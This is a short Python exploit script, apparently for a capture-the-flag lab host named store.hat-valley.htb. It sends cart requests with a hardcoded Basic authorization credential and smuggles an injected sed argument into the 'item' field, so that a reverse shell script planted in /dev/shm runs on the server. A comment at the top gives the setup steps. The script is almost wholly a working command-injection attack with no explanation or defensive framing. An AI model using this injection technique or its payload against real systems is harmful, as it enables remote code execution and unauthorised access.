# before run the script take a ssh shell on target and add a reverse shell script on /dev/shm/ diretory named like rce.sh
import requests


class Store:

	def __init__(self):
		self.url = "http://store.hat-valley.htb/cart_actions.php"
		self.header = {"Authorization" : "Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A="}
		self.add_item = {"item": "1","user": "4d03-5814-524-bd14","action": "add_item"}
		self.payload = "/\' -e \'1e /dev/shm/rce.sh\' \'"
		self.delete_item = {"item": self.payload,"user": "4d03-5814-524-bd14","action": "delete_item"}

		# adding item to cart 
		res = requests.post(url=self.url,headers=self.header,data=self.add_item)
		if res.text == "Item added successfully!":
			self.RunCommand()
		else:
			print('Item add failed')

        # delete item from cart
	def RunCommand(self):
		res = requests.post(url=self.url,headers=self.header,data=self.delete_item)
		print(res.text)


Run = Store() 